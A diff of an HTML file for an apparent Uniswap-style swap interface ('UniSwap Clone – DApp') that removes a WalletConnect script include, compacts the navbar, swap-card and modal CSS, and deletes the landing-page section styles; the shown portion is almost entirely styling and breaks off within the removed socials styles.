@@ -6,1014 +6,289 @@
   <title>UniSwap Clone – DApp</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
-  <!-- WalletConnect / Web3Modal v3 -->
-  <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.4.3/dist/index.umd.js"></script>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
     :root {
-      --bg:        #0D0E14;
-      --surface:   #13141C;
-      --card:      #1A1B26;
-      --card2:     #21222E;
-      --border:    #2C2D3A;
-      --text:      #FFFFFF;
-      --muted:     #7C7E9A;
-      --accent:    #FC72FF;
-      --accent2:   #A855F7;
-      --gradient:  linear-gradient(135deg, #FC72FF 0%, #A855F7 100%);
-      --green:     #21C55D;
-      --radius:    16px;
-      --radius-sm: 10px;
+      --bg:#0D0E14; --surface:#13141C; --card:#1A1B26; --card2:#21222E;
+      --border:#2C2D3A; --text:#FFFFFF; --muted:#7C7E9A;
+      --accent:#FC72FF; --accent2:#A855F7;
+      --gradient:linear-gradient(135deg,#FC72FF 0%,#A855F7 100%);
+      --green:#21C55D; --radius:16px; --radius-sm:10px;
     }
+    body { background:var(--bg); color:var(--text); font-family:'Inter',sans-serif; min-height:100vh; display:flex; flex-direction:column; overflow-x:hidden; }
+    nav { display:flex; align-items:center; justify-content:space-between; padding:14px 24px; border-bottom:1px solid var(--border); background:var(--surface); position:sticky; top:0; z-index:100; }
+    .nav-logo { display:flex; align-items:center; gap:10px; font-weight:700; font-size:1.1rem; cursor:pointer; }
+    .logo-icon { width:36px; height:36px; background:var(--gradient); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:18px; flex-shrink:0; }
+    .nav-links { display:flex; gap:4px; }
+    .nav-links a { color:var(--muted); text-decoration:none; font-size:0.9rem; font-weight:500; padding:7px 14px; border-radius:20px; transition:all .2s; cursor:pointer; }
+    .nav-links a:hover { color:var(--text); background:var(--card); }
+    .nav-links a.active { color:var(--accent); }
+    .nav-right { display:flex; align-items:center; gap:10px; }
+    .btn-connect-nav { background:var(--gradient); color:#fff; border:none; padding:9px 18px; border-radius:20px; font-weight:600; font-size:0.88rem; cursor:pointer; transition:opacity .2s; white-space:nowrap; }
+    .btn-connect-nav:hover { opacity:.85; }
+    .icon-btn { width:36px; height:36px; background:var(--card); border:1px solid var(--border); border-radius:10px; display:flex; align-items:center; justify-content:center; cursor:pointer; color:var(--muted); font-size:18px; transition:all .2s; flex-shrink:0; }
+    .icon-btn:hover { color:var(--text); border-color:var(--accent); }
+    @media(max-width:600px){ nav{padding:12px 14px;} .nav-links{display:none;} .nav-logo span{display:none;} .btn-connect-nav{padding:8px 13px;font-size:0.8rem;} }
+    .mobile-nav { display:none; position:fixed; bottom:0; left:0; right:0; background:var(--surface); border-top:1px solid var(--border); z-index:200; padding:8px 0 env(safe-area-inset-bottom,8px); }
+    .mobile-nav-inner { display:flex; justify-content:space-around; }
+    .mobile-nav-item { display:flex; flex-direction:column; align-items:center; gap:3px; padding:6px 12px; cursor:pointer; color:var(--muted); font-size:0.7rem; font-weight:500; border-radius:10px; transition:color .2s; -webkit-tap-highlight-color:transparent; }
+    .mobile-nav-item.active { color:var(--accent); }
+    .mobile-nav-item .mn-icon { font-size:22px; }
+    @media(max-width:600px){ .mobile-nav{display:block;} body{padding-bottom:calc(70px + env(safe-area-inset-bottom,0px));} }
+    .page { display:none; }
+    .page.active { display:block; }
+    .banner { background:linear-gradient(90deg,#1e0030 0%,#2a0050 100%); border:1px solid #5c1a80; border-radius:var(--radius); margin:20px auto; max-width:480px; width:calc(100% - 32px); padding:14px 18px; display:flex; align-items:center; gap:12px; font-size:0.88rem; }
+    .banner-icon { font-size:22px; flex-shrink:0; }
+    .banner span { color:var(--muted); }
+    .banner a { color:var(--accent); text-decoration:none; font-weight:500; }
+    .banner-arrow { margin-left:auto; color:var(--muted); }
+    main { display:flex; flex-direction:column; align-items:center; padding:0 16px 40px; }
+    .swap-card { background:var(--card); border:1px solid var(--border); border-radius:20px; padding:16px; width:100%; max-width:480px; }
+    .swap-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:14px; padding:0 4px; }
+    .swap-header h2 { font-size:1rem; font-weight:600; }
+    .token-box { background:var(--card2); border:1px solid var(--border); border-radius:var(--radius); padding:14px 16px; transition:border-color .2s; }
+    .token-box:focus-within { border-color:var(--accent2); }
+    .token-row { display:flex; align-items:center; gap:10px; }
+    .token-amount { flex:1; background:transparent; border:none; outline:none; font-size:2rem; font-weight:500; color:var(--text); width:100%; font-family:'Inter',sans-serif; min-width:0; }
+    @media(max-width:400px){ .token-amount{font-size:1.5rem;} }
+    .token-amount::placeholder { color:#3a3b4f; }
+    .token-amount::-webkit-outer-spin-button,.token-amount::-webkit-inner-spin-button { -webkit-appearance:none; }
+    .token-selector { display:flex; align-items:center; gap:8px; background:#0D0E14; border:1px solid var(--border); border-radius:30px; padding:6px 12px 6px 8px; cursor:pointer; white-space:nowrap; transition:border-color .2s; flex-shrink:0; -webkit-tap-highlight-color:transparent; }
+    .token-selector:hover { border-color:var(--accent); }
+    .token-selector .tname { font-weight:600; font-size:0.95rem; }
+    .token-selector .arr { color:var(--muted); font-size:12px; }
+    .token-icon { width:28px; height:28px; border-radius:50%; overflow:hidden; flex-shrink:0; }
+    .token-meta { display:flex; justify-content:space-between; margin-top:8px; font-size:0.8rem; color:var(--muted); }
+    .balance-max { display:flex; align-items:center; gap:6px; }
+    .btn-max { font-size:0.75rem; color:var(--accent); background:rgba(252,114,255,.1); border:none; padding:2px 8px; border-radius:6px; cursor:pointer; font-weight:600; }
+    .btn-max:hover { background:rgba(252,114,255,.2); }
+    .swap-divider { display:flex; justify-content:center; margin:-4px 0; position:relative; z-index:10; }
+    .swap-arrow-btn { width:38px; height:38px; background:var(--card); border:2px solid var(--border); border-radius:12px; display:flex; align-items:center; justify-content:center; cursor:pointer; color:var(--muted); transition:all .2s; font-size:18px; -webkit-tap-highlight-color:transparent; }
+    .swap-arrow-btn:hover { border-color:var(--accent); color:var(--accent); transform:rotate(180deg); }
+    .btn-connect-main { width:100%; padding:16px; margin-top:14px; background:rgba(252,114,255,.15); color:var(--accent); border:none; border-radius:var(--radius); font-size:1rem; font-weight:600; cursor:pointer; transition:all .2s; font-family:'Inter',sans-serif; -webkit-tap-highlight-color:transparent; }
+    .btn-connect-main:hover { background:rgba(252,114,255,.25); }
+    .btn-connect-main.ready { background:var(--gradient); color:#fff; animation:pulse 2.5s ease infinite; }
+    @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(252,114,255,0);} 50%{box-shadow:0 0 0 10px rgba(252,114,255,.15);} }
+    .disclaimer { margin-top:10px; background:var(--card2); border:1px solid var(--border); border-radius:var(--radius-sm); padding:12px 14px; font-size:0.8rem; color:var(--muted); display:flex; gap:10px; align-items:flex-start; }
+    .disclaimer a { color:var(--accent); text-decoration:none; }
+    .price-info { background:var(--card); border:1px solid var(--border); border-radius:16px; padding:14px 16px; margin-top:12px; width:100%; max-width:480px; }
+    .price-row { display:flex; justify-content:space-between; align-items:center; font-size:0.85rem; padding:6px 0; }
+    .price-row:not(:last-child) { border-bottom:1px solid var(--border); }
+    .price-label { color:var(--muted); display:flex; align-items:center; gap:6px; }
+    .price-value { font-weight:500; }
+    .price-value.accent { color:var(--accent); }
+    .info-icon { width:16px; height:16px; border:1px solid var(--muted); border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:10px; cursor:help; }
+    .edit-icon { cursor:pointer; color:var(--muted); font-size:14px; }
+    .edit-icon:hover { color:var(--accent); }
 
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Inter', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      overflow-x: hidden;
-    }
+    /* WALLET MODAL */
+    .wallet-modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.7); z-index:300; align-items:flex-end; justify-content:center; }
+    @media(min-width:600px){ .wallet-modal-overlay{align-items:center;} }
+    .wallet-modal-overlay.open { display:flex; }
+    .wallet-modal { background:var(--card); border:1px solid var(--border); border-radius:24px 24px 0 0; padding:24px 20px 32px; width:100%; max-width:420px; animation:slideUp .25s ease; }
+    @media(min-width:600px){ .wallet-modal{border-radius:24px;} }
+    @keyframes slideUp { from{transform:translateY(60px);opacity:0;} to{transform:translateY(0);opacity:1;} }
+    .wallet-modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
+    .wallet-modal-header h3 { font-size:1.05rem; font-weight:600; }
+    .wallet-modal-close { background:none; border:none; color:var(--muted); font-size:22px; cursor:pointer; }
+    .wallet-option { display:flex; align-items:center; gap:14px; padding:14px 16px; border:1px solid var(--border); border-radius:14px; cursor:pointer; margin-bottom:10px; transition:all .2s; -webkit-tap-highlight-color:transparent; }
+    .wallet-option:hover { border-color:var(--accent); background:rgba(252,114,255,.05); }
+    .wallet-option-icon { width:46px; height:46px; border-radius:12px; overflow:hidden; flex-shrink:0; }
+    .wallet-option-icon img { width:100%; height:100%; display:block; }
+    .wallet-option-info .wo-name { font-weight:600; font-size:0.95rem; }
+    .wallet-option-info .wo-desc { font-size:0.78rem; color:var(--muted); margin-top:2px; }
+    .wallet-badge { margin-left:auto; font-size:0.72rem; padding:3px 8px; border-radius:6px; font-weight:600; }
+    .badge-popular { background:rgba(252,114,255,.15); color:var(--accent); }
+    .badge-mobile  { background:rgba(33,197,93,.15); color:var(--green); }
+    .wallet-divider { text-align:center; font-size:0.8rem; color:var(--muted); margin:14px 0; position:relative; }
+    .wallet-divider::before,.wallet-divider::after { content:''; position:absolute; top:50%; width:42%; height:1px; background:var(--border); }
+    .wallet-divider::before { left:0; }
+    .wallet-divider::after  { right:0; }
 
-    /* ── NAVBAR ── */
-    nav {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 14px 24px;
-      border-bottom: 1px solid var(--border);
-      background: var(--surface);
-      position: sticky;
-      top: 0;
-      z-index: 100;
-    }
-    .nav-logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 700;
-      font-size: 1.1rem;
-      cursor: pointer;
-    }
-    .logo-icon {
-      width: 36px; height: 36px;
-      background: var(--gradient);
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 18px;
-      flex-shrink: 0;
-    }
-    .nav-links {
-      display: flex;
-      gap: 4px;
-    }
-    .nav-links a {
-      color: var(--muted);
-      text-decoration: none;
-      font-size: 0.9rem;
-      font-weight: 500;
-      padding: 7px 14px;
-      border-radius: 20px;
-      transition: all .2s;
-      cursor: pointer;
-    }
-    .nav-links a:hover { color: var(--text); background: var(--card); }
-    .nav-links a.active { color: var(--accent); }
-    .nav-right { display: flex; align-items: center; gap: 10px; }
-    .btn-connect-nav {
-      background: var(--gradient);
-      color: #fff;
-      border: none;
-      padding: 9px 18px;
-      border-radius: 20px;
-      font-weight: 600;
-      font-size: 0.88rem;
-      cursor: pointer;
-      transition: opacity .2s;
-      white-space: nowrap;
-    }
-    .btn-connect-nav:hover { opacity: .85; }
-    .icon-btn {
-      width: 36px; height: 36px;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      display: flex; align-items: center; justify-content: center;
-      cursor: pointer;
-      color: var(--muted);
-      font-size: 18px;
-      transition: all .2s;
-      flex-shrink: 0;
-    }
-    .icon-btn:hover { color: var(--text); border-color: var(--accent); }
+    /* TOKEN MODAL */
+    .modal-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,.6); z-index:200; align-items:flex-end; justify-content:center; }
+    @media(min-width:600px){ .modal-overlay{align-items:center;} }
+    .modal-overlay.open { display:flex; }
+    .modal { background:var(--card); border:1px solid var(--border); border-radius:24px 24px 0 0; padding:20px; width:100%; max-width:400px; max-height:80vh; overflow-y:auto; animation:slideUp .25s ease; }
+    @media(min-width:600px){ .modal{border-radius:20px;max-height:70vh;} }
+    .modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; }
+    .modal-header h3 { font-size:1rem; }
+    .modal-close { background:none; border:none; color:var(--muted); font-size:22px; cursor:pointer; }
+    .modal-search { width:100%; background:var(--card2); border:1px solid var(--border); border-radius:var(--radius-sm); padding:10px 14px; color:var(--text); font-size:0.9rem; margin-bottom:12px; outline:none; font-family:'Inter',sans-serif; }
+    .modal-search:focus { border-color:var(--accent2); }
+    .token-list-item { display:flex; align-items:center; gap:12px; padding:12px 8px; border-radius:var(--radius-sm); cursor:pointer; transition:background .15s; -webkit-tap-highlight-color:transparent; }
+    .token-list-item:hover,.token-list-item:active { background:var(--card2); }
+    .token-list-item .tinfo .tname2 { font-weight:600; font-size:0.9rem; }
+    .token-list-item .tinfo .tname3 { font-size:0.75rem; color:var(--muted); }
 
-    /* ── MOBILE NAV ── */
-    @media (max-width: 600px) {
-      nav { padding: 12px 14px; }
-      .nav-links { display: none; }
-      .nav-logo span { display: none; }
-      .btn-connect-nav { padding: 8px 13px; font-size: 0.8rem; }
-    }
-
-    /* ── MOBILE BOTTOM NAV ── */
-    .mobile-nav {
-      display: none;
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      background: var(--surface);
-      border-top: 1px solid var(--border);
-      z-index: 200;
-      padding: 8px 0 env(safe-area-inset-bottom, 8px);
-    }
-    .mobile-nav-inner {
-      display: flex;
-      justify-content: space-around;
-    }
-    .mobile-nav-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 3px;
-      padding: 6px 12px;
-      cursor: pointer;
-      color: var(--muted);
-      font-size: 0.7rem;
-      font-weight: 500;
-      border-radius: 10px;
-      transition: color .2s;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .mobile-nav-item.active { color: var(--accent); }
-    .mobile-nav-item .mn-icon { font-size: 22px; }
-    @media (max-width: 600px) {
-      .mobile-nav { display: block; }
-      body { padding-bottom: calc(70px + env(safe-area-inset-bottom, 0px)); }
-    }
-
-    /* ── PAGES ── */
-    .page { display: none; }
-    .page.active { display: block; }
-
-    /* ── BANNER ── */
-    .banner {
-      background: linear-gradient(90deg, #1e0030 0%, #2a0050 100%);
-      border: 1px solid #5c1a80;
-      border-radius: var(--radius);
-      margin: 20px auto;
-      max-width: 480px;
-      width: calc(100% - 32px);
-      padding: 14px 18px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      font-size: 0.88rem;
-    }
-    .banner-icon { font-size: 22px; flex-shrink: 0; }
-    .banner span { color: var(--muted); }
-    .banner a { color: var(--accent); text-decoration: none; font-weight: 500; }
-    .banner-arrow { margin-left: auto; color: var(--muted); }
-
-    /* ── MAIN SWAP CARD ── */
-    main {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 0 16px 40px;
-    }
-
-    .swap-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      padding: 16px;
-      width: 100%;
-      max-width: 480px;
-    }
-
-    .swap-header {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 14px;
-      padding: 0 4px;
-    }
-    .swap-header h2 { font-size: 1rem; font-weight: 600; }
-
-    /* ── TOKEN INPUT ── */
-    .token-box {
-      background: var(--card2);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 14px 16px;
-      transition: border-color .2s;
-    }
-    .token-box:focus-within { border-color: var(--accent2); }
-
-    .token-row {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-    .token-amount {
-      flex: 1;
-      background: transparent;
-      border: none;
-      outline: none;
-      font-size: 2rem;
-      font-weight: 500;
-      color: var(--text);
-      width: 100%;
-      font-family: 'Inter', sans-serif;
-      min-width: 0;
-    }
-    @media (max-width: 400px) { .token-amount { font-size: 1.5rem; } }
-    .token-amount::placeholder { color: #3a3b4f; }
-    .token-amount::-webkit-outer-spin-button,
-    .token-amount::-webkit-inner-spin-button { -webkit-appearance: none; }
-
-    .token-selector {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      background: #0D0E14;
-      border: 1px solid var(--border);
-      border-radius: 30px;
-      padding: 6px 12px 6px 8px;
-      cursor: pointer;
-      white-space: nowrap;
-      transition: border-color .2s;
-      flex-shrink: 0;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .token-selector:hover { border-color: var(--accent); }
-    .token-selector .tname { font-weight: 600; font-size: 0.95rem; }
-    .token-selector .arr { color: var(--muted); font-size: 12px; }
-
-    .token-icon {
-      width: 28px; height: 28px;
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 16px;
-      flex-shrink: 0;
-    }
-    .icon-usdt { background: #26A17B; }
-    .icon-bnb  { background: #F3BA2F; }
-    .icon-eth  { background: #627EEA; }
-
-    .token-meta {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 8px;
-      font-size: 0.8rem;
-      color: var(--muted);
-    }
-    .balance-max { display: flex; align-items: center; gap: 6px; }
-    .btn-max {
-      font-size: 0.75rem;
-      color: var(--accent);
-      background: rgba(252,114,255,.1);
-      border: none;
-      padding: 2px 8px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 600;
-    }
-    .btn-max:hover { background: rgba(252,114,255,.2); }
-
-    /* ── SWAP ARROW ── */
-    .swap-divider {
-      display: flex;
-      justify-content: center;
-      margin: -4px 0;
-      position: relative;
-      z-index: 10;
-    }
-    .swap-arrow-btn {
-      width: 38px; height: 38px;
-      background: var(--card);
-      border: 2px solid var(--border);
-      border-radius: 12px;
-      display: flex; align-items: center; justify-content: center;
-      cursor: pointer;
-      color: var(--muted);
-      transition: all .2s;
-      font-size: 18px;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .swap-arrow-btn:hover {
-      border-color: var(--accent);
-      color: var(--accent);
-      transform: rotate(180deg);
-    }
-
-    /* ── CONNECT BUTTON ── */
-    .btn-connect-main {
-      width: 100%;
-      padding: 16px;
-      margin-top: 14px;
-      background: rgba(252,114,255,.15);
-      color: var(--accent);
-      border: none;
-      border-radius: var(--radius);
-      font-size: 1rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all .2s;
-      font-family: 'Inter', sans-serif;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .btn-connect-main:hover { background: rgba(252,114,255,.25); }
-    .btn-connect-main.ready {
-      background: var(--gradient);
-      color: #fff;
-      animation: pulse 2.5s ease infinite;
-    }
-    @keyframes pulse {
-      0%,100% { box-shadow: 0 0 0 0 rgba(252,114,255,.0); }
-      50%      { box-shadow: 0 0 0 10px rgba(252,114,255,.15); }
-    }
-
-    /* ── DISCLAIMER BOX ── */
-    .disclaimer {
-      margin-top: 10px;
-      background: var(--card2);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-sm);
-      padding: 12px 14px;
-      font-size: 0.8rem;
-      color: var(--muted);
-      display: flex;
-      gap: 10px;
-      align-items: flex-start;
-    }
-    .disclaimer a { color: var(--accent); text-decoration: none; }
-
-    /* ── PRICE INFO ── */
-    .price-info {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 14px 16px;
-      margin-top: 12px;
-      width: 100%;
-      max-width: 480px;
-    }
-    .price-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 0.85rem;
-      padding: 6px 0;
-    }
-    .price-row:not(:last-child) { border-bottom: 1px solid var(--border); }
-    .price-label { color: var(--muted); display: flex; align-items: center; gap: 6px; }
-    .price-value { font-weight: 500; }
-    .price-value.accent { color: var(--accent); }
-    .info-icon {
-      width: 16px; height: 16px;
-      border: 1px solid var(--muted);
-      border-radius: 50%;
-      display: inline-flex;
-      align-items: center; justify-content: center;
-      font-size: 10px;
-      cursor: help;
-    }
-    .edit-icon { cursor: pointer; color: var(--muted); font-size: 14px; }
-    .edit-icon:hover { color: var(--accent); }
-
-    /* ── WALLET MODAL ── */
-    .wallet-modal-overlay {
-      display: none;
-      position: fixed; inset: 0;
-      background: rgba(0,0,0,.7);
-      z-index: 300;
-      align-items: flex-end;
-      justify-content: center;
-    }
-    @media (min-width: 600px) {
-      .wallet-modal-overlay { align-items: center; }
-    }
-    .wallet-modal-overlay.open { display: flex; }
-    .wallet-modal {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 24px 24px 0 0;
-      padding: 24px 20px 32px;
-      width: 100%;
-      max-width: 420px;
-      animation: slideUp .25s ease;
-    }
-    @media (min-width: 600px) {
-      .wallet-modal { border-radius: 24px; }
-    }
-    @keyframes slideUp {
-      from { transform: translateY(60px); opacity: 0; }
-      to   { transform: translateY(0);    opacity: 1; }
-    }
-    .wallet-modal-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    .wallet-modal-header h3 { font-size: 1.05rem; font-weight: 600; }
-    .wallet-modal-close {
-      background: none; border: none;
-      color: var(--muted); font-size: 22px; cursor: pointer;
-    }
-    .wallet-option {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      padding: 14px 16px;
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      cursor: pointer;
-      margin-bottom: 10px;
-      transition: all .2s;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .wallet-option:hover { border-color: var(--accent); background: rgba(252,114,255,.05); }
-    .wallet-option-icon {
-      width: 44px; height: 44px;
-      border-radius: 12px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 26px;
-      flex-shrink: 0;
-    }
-    .wallet-option-info .wo-name { font-weight: 600; font-size: 0.95rem; }
-    .wallet-option-info .wo-desc { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
-    .wallet-badge {
-      margin-left: auto;
-      font-size: 0.72rem;
-      padding: 3px 8px;
-      border-radius: 6px;
-      font-weight: 600;
-    }
-    .badge-popular { background: rgba(252,114,255,.15); color: var(--accent); }
-    .badge-mobile  { background: rgba(33,197,93,.15);   color: var(--green); }
-    .wallet-divider {
-      text-align: center;
-      font-size: 0.8rem;
-      color: var(--muted);
-      margin: 14px 0;
-      position: relative;
-    }
-    .wallet-divider::before, .wallet-divider::after {
-      content: '';
-      position: absolute;
-      top: 50%; width: 42%;
-      height: 1px;
-      background: var(--border);
-    }
-    .wallet-divider::before { left: 0; }
-    .wallet-divider::after  { right: 0; }
-
-    /* ── TOKEN DROPDOWN MODAL ── */
-    .modal-overlay {
-      display: none;
-      position: fixed; inset: 0;
-      background: rgba(0,0,0,.6);
-      z-index: 200;
-      align-items: flex-end;
-      justify-content: center;
-    }
-    @media (min-width: 600px) {
-      .modal-overlay { align-items: center; }
-    }
-    .modal-overlay.open { display: flex; }
-    .modal {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 24px 24px 0 0;
-      padding: 20px;
-      width: 100%;
-      max-width: 400px;
-      max-height: 80vh;
-      overflow-y: auto;
-      animation: slideUp .25s ease;
-    }
-    @media (min-width: 600px) {
-      .modal { border-radius: 20px; max-height: 70vh; }
-    }
-    .modal-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 14px;
-    }
-    .modal-header h3 { font-size: 1rem; }
-    .modal-close {
-      background: none; border: none;
-      color: var(--muted); font-size: 22px;
-      cursor: pointer;
-    }
-    .modal-search {
-      width: 100%;
-      background: var(--card2);
-      border: 1px solid var(--border);
-      border-radius: var(--radius-sm);
-      padding: 10px 14px;
-      color: var(--text);
-      font-size: 0.9rem;
-      margin-bottom: 12px;
-      outline: none;
-      font-family: 'Inter', sans-serif;
-    }
-    .modal-search:focus { border-color: var(--accent2); }
-    .token-list-item {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 12px 8px;
-      border-radius: var(--radius-sm);
-      cursor: pointer;
-      transition: background .15s;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .token-list-item:hover { background: var(--card2); }
-    .token-list-item:active { background: var(--card2); }
-    .token-list-item .tinfo .tname2 { font-weight: 600; font-size: 0.9rem; }
-    .token-list-item .tinfo .tname3 { font-size: 0.75rem; color: var(--muted); }
-
-    /* ══════════════════════════════════════════
-       ── LANDING PAGE SECTIONS ──
-    ══════════════════════════════════════════ */
-    .landing-section {
-      width: 100%;
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 0 20px;
-    }
-
-    /* ── HERO ── */
-    .hero-section {
-      text-align: center;
-      padding: 80px 20px 60px;
-    }
-    .hero-section h1 {
-      font-size: clamp(2rem, 5vw, 3.6rem);
-      font-weight: 700;
-      line-height: 1.15;
-      background: var(--gradient);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      margin-bottom: 16px;
-    }
-    .hero-section p {
-      font-size: clamp(0.95rem, 2vw, 1.15rem);
-      color: var(--muted);
-      max-width: 620px;
-      margin: 0 auto 28px;
-      line-height: 1.7;
-    }
-    .hero-cta {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: var(--gradient);
-      color: #fff;
-      text-decoration: none;
-      padding: 13px 28px;
-      border-radius: 30px;
-      font-weight: 600;
-      font-size: 1rem;
-      transition: opacity .2s;
-    }
-    .hero-cta:hover { opacity: .88; }
-
-    /* ── STATS ── */
-    .stats-section {
-      padding: 60px 20px;
-      border-top: 1px solid var(--border);
-      border-bottom: 1px solid var(--border);
-    }
-    .stats-title {
-      text-align: center;
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--muted);
-      letter-spacing: .06em;
-      text-transform: uppercase;
-      margin-bottom: 40px;
-    }
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 24px;
-      max-width: 900px;
-      margin: 0 auto;
-    }
-    @media (max-width: 520px) {
-      .stats-grid { grid-template-columns: 1fr 1fr; gap: 16px; }
-    }
-    .stat-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 24px 20px;
-    }
-    .stat-label { font-size: 0.82rem; color: var(--muted); margin-bottom: 8px; }
-    .stat-value {
-      font-size: clamp(1.6rem, 4vw, 2.6rem);
-      font-weight: 700;
-      background: var(--gradient);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      line-height: 1.1;
-    }
-
-    /* ── BUILT FOR ── */
-    .built-section {
-      padding: 70px 20px;
-    }
-    .section-eyebrow {
-      font-size: 0.8rem;
-      font-weight: 600;
-      letter-spacing: .08em;
-      text-transform: uppercase;
-      color: var(--accent);
-      margin-bottom: 8px;
-    }
-    .section-title {
-      font-size: clamp(1.5rem, 3vw, 2.2rem);
-      font-weight: 700;
-      margin-bottom: 12px;
-    }
-    .section-sub {
-      color: var(--muted);
-      font-size: 0.95rem;
-      max-width: 520px;
-      line-height: 1.65;
-      margin-bottom: 32px;
-    }
-    .ticker-row {
-      display: flex;
-      gap: 12px;
-      overflow-x: auto;
-      padding-bottom: 6px;
-      scrollbar-width: none;
-    }
-    .ticker-row::-webkit-scrollbar { display: none; }
-    .ticker-chip {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 30px;
-      padding: 8px 16px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      white-space: nowrap;
-      font-size: 0.88rem;
-      flex-shrink: 0;
-    }
-    .ticker-chip .t-sym { font-weight: 700; }
-    .ticker-chip .t-price { color: var(--muted); }
-    .ticker-chip .t-chg { font-size: 0.78rem; padding: 2px 6px; border-radius: 5px; }
-    .down { background: rgba(255,80,80,.15); color: #ff6060; }
-    .up   { background: rgba(33,197,93,.15); color: var(--green); }
-
-    /* ── PRODUCT CARDS ── */
-    .products-section {
-      padding: 20px 20px 70px;
-    }
-    .products-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 16px;
-      max-width: 900px;
-      margin: 0 auto;
-    }
-    @media (max-width: 560px) {
-      .products-grid { grid-template-columns: 1fr; }
-    }
-    .product-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      padding: 24px;
-      text-decoration: none;
-      color: var(--text);
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      transition: border-color .2s, transform .2s;
-    }
-    .product-card:hover { border-color: var(--accent2); transform: translateY(-2px); }
-    .product-card .pc-icon { font-size: 28px; margin-bottom: 4px; }
-    .product-card .pc-title { font-weight: 700; font-size: 1.05rem; }
-    .product-card .pc-desc { font-size: 0.84rem; color: var(--muted); line-height: 1.55; }
-    .product-card .pc-link {
-      margin-top: auto;
-      font-size: 0.82rem;
-      color: var(--accent);
-      font-weight: 600;
-    }
-
-    /* ── LIQUIDITY ── */
-    .liquidity-section {
-      padding: 60px 20px;
-      background: linear-gradient(180deg, transparent, rgba(168,85,247,.04) 50%, transparent);
-      border-top: 1px solid var(--border);
-      border-bottom: 1px solid var(--border);
-    }
-    .liq-inner {
-      max-width: 700px;
-      margin: 0 auto;
-      text-align: center;
-    }
-
-    /* ── EXPLORE ── */
-    .explore-section {
-      padding: 70px 20px;
-    }
-    .explore-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 16px;
-      max-width: 900px;
-      margin: 24px auto 0;
-    }
-    @media (max-width: 640px) {
-      .explore-grid { grid-template-columns: 1fr; }
-    }
-    .explore-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 20px;
-      text-decoration: none;
-      color: var(--text);
-      transition: border-color .2s;
-    }
-    .explore-card:hover { border-color: var(--accent2); }
-    .explore-card .ec-icon { font-size: 26px; margin-bottom: 10px; }
-    .explore-card .ec-title { font-weight: 700; font-size: 0.95rem; margin-bottom: 6px; }
-    .explore-card .ec-desc { font-size: 0.8rem; color: var(--muted); line-height: 1.55; }
-
-    /* ── SOCIALS ── */
-    .socials-section {
-      padding: 60px 20px;
